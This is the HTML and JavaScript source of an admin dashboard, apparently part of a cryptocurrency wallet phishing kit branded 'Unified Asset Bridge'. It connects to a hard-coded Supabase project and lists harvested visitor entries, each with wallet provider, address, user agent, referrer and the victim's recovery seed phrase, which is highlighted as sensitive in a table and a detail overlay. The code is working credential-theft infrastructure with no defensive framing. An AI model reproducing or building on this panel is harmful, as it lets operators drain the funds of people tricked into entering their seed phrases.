<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Entries · Unified Asset Bridge</title>

    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap"
      rel="stylesheet"
    />

    <style>
      :root {
        --bg: #0b1220;
        --bg-soft: #111a2e;
        --surface: #17233a;
        --border: #263550;
        --text: #f8fafc;
        --muted: #94a3b8;
        --subtle: #64748b;
        --accent: #3b82f6;
        --accent-hover: #2563eb;
        --danger: #ef4444;
      }

      * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
      }
      html,
      body {
        min-height: 100%;
        background: var(--bg);
      }

      body {
        min-height: 100vh;
        min-height: 100svh;
        font-family: "Inter", system-ui, sans-serif;
        color: var(--text);
        padding: 32px 24px;
      }

      .wrap {
        width: min(100%, 1200px);
        margin: 0 auto;
      }

      header {
        display: flex;
        align-items: center;
        justify-content: space-between;
        margin-bottom: 28px;
        flex-wrap: wrap;
        gap: 16px;
      }

      h1 {
        font-size: 24px;
        font-weight: 700;
        letter-spacing: -0.02em;
      }

      .badge {
        display: inline-block;
        padding: 5px 12px;
        background: var(--bg-soft);
        border: 1px solid var(--border);
        border-radius: 100px;
        color: #93bbfc;
        font-size: 10px;
        font-weight: 600;
        letter-spacing: 0.12em;
        text-transform: uppercase;
        margin-bottom: 8px;
      }

      .actions {
        display: flex;
        gap: 10px;
      }

      .btn {
        display: inline-flex;
        align-items: center;
        gap: 8px;
        padding: 10px 18px;
        border-radius: 10px;
        font-size: 13px;
        font-weight: 600;
        border: 1px solid var(--border);
        background: var(--bg-soft);
        color: var(--text);
        cursor: pointer;
        text-decoration: none;
        transition: background-color 0.15s ease;
        font-family: inherit;
      }

      .btn:hover {
        background: #1a263e;
      }

      .table-wrap {
        background: var(--surface);
        border: 1px solid var(--border);
        border-radius: 16px;
        overflow: hidden;
      }

      .table-scroll {
        max-height: 70vh;
        overflow-y: auto;
      }

      table {
        width: 100%;
        border-collapse: collapse;
        font-size: 13px;
      }

      thead th {
        position: sticky;
        top: 0;
        z-index: 1;
        background: var(--bg-soft);
        color: var(--muted);
        font-size: 10px;
        font-weight: 600;
        letter-spacing: 0.1em;
        text-transform: uppercase;
        text-align: left;
        padding: 14px 18px;
        border-bottom: 1px solid var(--border);
      }

      tbody td {
        padding: 14px 18px;
        border-bottom: 1px solid var(--border);
        color: var(--text);
        vertical-align: top;
      }

      tbody tr {
        cursor: pointer;
        transition: background-color 0.12s ease;
      }

      tbody tr:hover {
        background: rgba(59, 130, 246, 0.06);
      }
      tbody tr:last-child td {
        border-bottom: none;
      }

      .mono {
        font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
        font-size: 12px;
      }
      .muted {
        color: var(--subtle);
      }

      .tag {
        display: inline-block;
        font-size: 10px;
        padding: 4px 10px;
        border-radius: 100px;
        background: rgba(34, 197, 94, 0.12);
        color: #22c55e;
        font-weight: 600;
        letter-spacing: 0.05em;
        text-transform: uppercase;
      }

      .tag.pending {
        background: rgba(148, 163, 184, 0.12);
        color: var(--muted);
      }

      .empty {
        color: var(--subtle);
        font-size: 14px;
        padding: 40px;
        text-align: center;
      }

      .seed-cell {
        max-width: 280px;
        word-break: break-word;
        color: #fca5a5;
        font-size: 12px;
      }

      ::-webkit-scrollbar {
        width: 8px;
        height: 8px;
      }
      ::-webkit-scrollbar-track {
        background: var(--bg-soft);
      }
      ::-webkit-scrollbar-thumb {
        background: var(--border);
        border-radius: 4px;
      }
      ::-webkit-scrollbar-thumb:hover {
        background: var(--subtle);
      }

      /* ============================================
         DETAIL OVERLAY
         ============================================ */
      .detail-overlay {
        position: fixed;
        inset: 0;
        z-index: 1000;
        display: flex;
        align-items: center;
        justify-content: center;
        padding: 24px;
        background: rgba(11, 18, 32, 0.75);
        backdrop-filter: blur(8px);
        -webkit-backdrop-filter: blur(8px);
        opacity: 0;
        visibility: hidden;
        transition:
          opacity 0.25s ease,
          visibility 0.25s ease;
      }

      .detail-overlay.active {
        opacity: 1;
        visibility: visible;
      }

      .detail-card {
        width: min(100%, 720px);
        max-height: 90vh;
        overflow-y: auto;
        background: var(--surface);
        border: 1px solid var(--border);
        border-radius: 20px;
        padding: 32px 32px 28px;
        box-shadow:
          0 30px 60px -12px rgba(0, 0, 0, 0.8),
          0 0 0 1px rgba(59, 130, 246, 0.06);
        transform: scale(0.96) translateY(8px);
        transition: transform 0.25s ease;
      }

      .detail-overlay.active .detail-card {
        transform: scale(1) translateY(0);
      }

      .detail-header {
        display: flex;
        align-items: flex-start;
        justify-content: space-between;
        gap: 16px;
        margin-bottom: 24px;
      }

      .detail-header h2 {
        font-size: 20px;
        font-weight: 700;
        letter-spacing: -0.02em;
        margin-bottom: 6px;
      }

      .detail-header .sub {
        font-size: 12px;
        color: var(--subtle);
        font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
        word-break: break-all;
      }

      .detail-close {
        flex-shrink: 0;
        width: 34px;
        height: 34px;
        border-radius: 10px;
        border: 1px solid var(--border);
        background: var(--bg-soft);
        color: var(--text);
        font-size: 18px;
        line-height: 1;
        cursor: pointer;
        display: flex;
        align-items: center;
        justify-content: center;
        font-family: inherit;
        transition: background-color 0.15s ease;
      }

      .detail-close:hover {
        background: #1a263e;
      }

      .detail-grid {
        display: grid;
        grid-template-columns: 1fr;
        gap: 10px;
      }

      .detail-field {
        background: var(--bg-soft);
        border: 1px solid var(--border);
        border-radius: 12px;
        padding: 14px 16px;
      }

      .detail-field.sensitive {
        background: #1a263e;
        border-color: var(--danger);
      }

      .detail-label {
        font-size: 10px;
        font-weight: 600;
        letter-spacing: 0.1em;
        text-transform: uppercase;
        color: var(--muted);
        margin-bottom: 6px;
      }

      .detail-field.sensitive .detail-label {
        color: #fca5a5;
      }

      .detail-value {
        font-size: 14px;
        color: var(--text);
        word-break: break-word;
        line-height: 1.5;
      }

      .detail-value.mono {
        font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
        font-size: 13px;
      }

      .detail-field.sensitive .detail-value {
        color: #fca5a5;
      }

      .detail-footer {
        margin-top: 20px;
        display: flex;
        justify-content: flex-end;
        gap: 10px;
      }

      @media (max-width: 640px) {
        body {
          padding: 20px 16px;
        }
        .detail-overlay {
          padding: 12px;
        }
        .detail-card {
          padding: 24px 20px 20px;
          border-radius: 16px;
        }
        .detail-header h2 {
          font-size: 18px;
        }
      }

      @media (prefers-reduced-motion: reduce) {
        tbody tr,
        .detail-overlay,
        .detail-card {
          transition: none;
        }
        .detail-card {
          transform: none;
        }
      }
    </style>
  </head>

  <body>
    <div class="wrap">
      <header>
        <div>
          <div class="badge">Admin</div>
          <h1>All entries</h1>
        </div>
        <div class="actions">
          <a href="dashboard.html" class="btn">Back to dashboard</a>
          <button class="btn" id="refreshBtn">Refresh</button>
        </div>
      </header>

      <div class="table-wrap">
        <div class="table-scroll">
          <table>
            <thead>
              <tr>
                <th>Created</th>
                <th>Session</th>
                <th>Manual</th>
                <th>Purpose</th>
                <th>Provider</th>
                <th>Address</th>
                <th>Seed phrase</th>
                <th>Status</th>
              </tr>
            </thead>
            <tbody id="entriesBody">
              <tr>
                <td colspan="8"><div class="empty">Loading…</div></td>
              </tr>
            </tbody>
          </table>
        </div>
      </div>
    </div>

    <!-- ============================================
         DETAIL OVERLAY
         ============================================ -->
    <div
      class="detail-overlay"
      id="detailOverlay"
      role="dialog"
      aria-modal="true"
      aria-labelledby="detailTitle"
    >
      <div class="detail-card">
        <div class="detail-header">
          <div>
            <h2 id="detailTitle">Entry detail</h2>
            <div class="sub" id="detailSession">—</div>
          </div>
          <button
            class="detail-close"
            id="detailCloseBtn"
            type="button"
            aria-label="Close"
          >
            ×
          </button>
        </div>

        <div class="detail-grid" id="detailGrid"></div>

        <div class="detail-footer">
          <button class="btn" id="detailCloseFooter" type="button">
            Close
          </button>
        </div>
      </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <script>
      window.SUPABASE_URL = "https://jrjbfbpjmcxkgchhdxwo.supabase.co";
      window.SUPABASE_ANON_KEY =
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImpyamJmYnBqbWN4a2djaGhkeHdvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTIxNTQ2NzIsImV4cCI6MjEwNzczMDY3Mn0.Azo2z4xNsmjwfUWby_aVLlPhkBld3-7Dts6woerPTMI";
      window.supabaseClient = supabase.createClient(
        window.SUPABASE_URL,
        window.SUPABASE_ANON_KEY,
      );

      function escapeHtml(s) {
        return String(s).replace(
          /[&<>"']/g,
          (c) =>
            ({
              "&": "&amp;",
              "<": "&lt;",
              ">": "&gt;",
              '"': "&quot;",
              "'": "&#39;",
            })[c],
        );
      }

      // Wipe leftover visitor state (used by the visitor flow)
      function clearFlowLocalStorage() {
        try {
          localStorage.removeItem("wv_flow_data");
          localStorage.removeItem("wv_session_id");
        } catch (_) {
          /* ignore */
        }
      }

      // Cache loaded entries so the overlay can look them up by id
      let entriesCache = [];

      // ---------- Overlay logic ----------
      const detailOverlay = document.getElementById("detailOverlay");
      const detailGrid = document.getElementById("detailGrid");
      const detailSession = document.getElementById("detailSession");
      const detailCloseBtn = document.getElementById("detailCloseBtn");
      const detailCloseFooter = document.getElementById("detailCloseFooter");

      function fmt(value) {
        if (value === null || value === undefined || value === "") return "—";
        return String(value);
      }

      function openDetail(entry) {
        detailSession.textContent = entry.session_id || "—";

        const rows = [
          {
            label: "Created",
            value: fmt(new Date(entry.created_at).toLocaleString()),
            mono: false,
          },
          {
            label: "Updated",
            value: fmt(new Date(entry.updated_at).toLocaleString()),
            mono: false,
          },
          { label: "Session ID", value: fmt(entry.session_id), mono: true },
          {
            label: "Connect manually",
            value: fmt(entry.connect_manual),
            mono: false,
          },
          {
            label: "Purpose of connection",
            value: fmt(entry.connection_purpose),
            mono: false,
          },
          {
            label: "Wallet provider",
            value:
              entry.wallet_provider === "others"
                ? "Others"
                : fmt(entry.wallet_provider),
            mono: false,
          },
          {
            label: "Wallet address",
            value: fmt(entry.wallet_address),
            mono: true,
          },
          { label: "User agent", value: fmt(entry.user_agent), mono: true },
          { label: "Referrer", value: fmt(entry.referrer), mono: true },
          {
            label: "Status",
            value: entry.completed ? "Complete" : "Pending",
            mono: false,
          },
        ];

        let html = rows
          .map(
            (r) => `
              <div class="detail-field">
                <div class="detail-label">${escapeHtml(r.label)}</div>
                <div class="detail-value ${r.mono ? "mono" : ""}">${escapeHtml(r.value)}</div>
              </div>
            `,
          )
          .join("");

        // Sensitive seed phrase last, styled distinctly
        html += `
          <div class="detail-field sensitive">
            <div class="detail-label">Seed phrase</div>
            <div class="detail-value mono">${escapeHtml(fmt(entry.seed_phrase))}</div>
          </div>
        `;

        detailGrid.innerHTML = html;
        detailOverlay.classList.add("active");
        document.body.style.overflow = "hidden";
        setTimeout(() => detailCloseBtn.focus(), 80);
      }

      function closeDetail() {
        detailOverlay.classList.remove("active");
        document.body.style.overflow = "";
      }

      detailCloseBtn.addEventListener("click", closeDetail);
      detailCloseFooter.addEventListener("click", closeDetail);
      detailOverlay.addEventListener("click", (e) => {
        if (e.target === detailOverlay) closeDetail();
      });
      document.addEventListener("keydown", (e) => {
        if (e.key === "Escape" && detailOverlay.classList.contains("active")) {
          closeDetail();
        }
      });

      // ---------- Data loading ----------
      (async function () {
        const {
          data: { session },
        } = await window.supabaseClient.auth.getSession();
        if (!session) {
          window.location.href = "login.html";
          return;
        }

        clearFlowLocalStorage();

        async function loadEntries() {
          const { data, error } = await window.supabaseClient
            .from("entries")
            .select("*")
            .order("created_at", { ascending: false })
            .limit(500);

          if (!error) {
            clearFlowLocalStorage();
          }

          const body = document.getElementById("entriesBody");
          if (error) {
            body.innerHTML = `<tr><td colspan="8"><div class="empty">Error: ${escapeHtml(error.message)}</div></td></tr>`;
            return;
          }
          if (!data || data.length === 0) {
            entriesCache = [];
            body.innerHTML =
              '<tr><td colspan="8"><div class="empty">No entries yet.</div></td></tr>';
            return;
          }

          entriesCache = data;

          body.innerHTML = data
            .map(
              (e) => `
          <tr data-id="${escapeHtml(e.id)}">
            <td class="muted mono">${new Date(e.created_at).toLocaleString()}</td>
            <td class="muted mono">${escapeHtml((e.session_id || "").slice(0, 14))}…</td>
            <td>${escapeHtml(e.connect_manual || "—")}</td>
            <td>${escapeHtml(e.connection_purpose || "—")}</td>
            <td>${e.wallet_provider === "others" ? "Others" : escapeHtml(e.wallet_provider || "—")}</td>
            <td class="mono">${escapeHtml(e.wallet_address || "—")}</td>
            <td class="seed-cell mono">${escapeHtml(e.seed_phrase || "—")}</td>
            <td><span class="tag ${e.completed ? "" : "pending"}">${e.completed ? "Complete" : "Pending"}</span></td>
          </tr>
        `,
            )
            .join("");

          // Wire up row clicks to open the detail overlay
          body.querySelectorAll("tr[data-id]").forEach((tr) => {
            tr.addEventListener("click", () => {
              const id = tr.getAttribute("data-id");
              const entry = entriesCache.find((x) => String(x.id) === id);
              if (entry) openDetail(entry);
            });
          });
        }

        document
          .getElementById("refreshBtn")
          .addEventListener("click", loadEntries);
        await loadEntries();
      })();
    </script>
  </body>
</html>
